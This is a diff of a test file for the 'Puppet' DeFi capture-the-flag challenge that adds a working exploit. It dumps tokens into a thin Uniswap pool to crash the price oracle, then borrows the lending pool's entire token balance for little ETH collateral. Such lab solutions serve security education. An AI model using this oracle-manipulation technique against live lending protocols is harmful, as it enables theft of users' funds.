@@ -101,9 +101,28 @@ describe('[Challenge] Puppet', function () {
         ).to.be.eq(POOL_INITIAL_TOKEN_BALANCE.mul('2'));
     });
 
-    it('Exploit', async function () {
+    it("Exploit", async function () {
         /** CODE YOUR EXPLOIT HERE */
-    });
+    
+        await this.token
+          .connect(attacker)
+          .approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+    
+        const tokenToSwap = ATTACKER_INITIAL_TOKEN_BALANCE.sub(1);
+        await this.uniswapExchange
+          .connect(attacker)
+          .tokenToEthSwapInput(
+            tokenToSwap,
+            ethers.utils.parseEther("9.9"),
+            (await ethers.provider.getBlock("latest")).timestamp * 2
+          );
+    
+        await this.lendingPool
+          .connect(attacker)
+          .borrow(POOL_INITIAL_TOKEN_BALANCE, {
+            value: ethers.utils.parseEther("19.67"),
+          });
+      });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
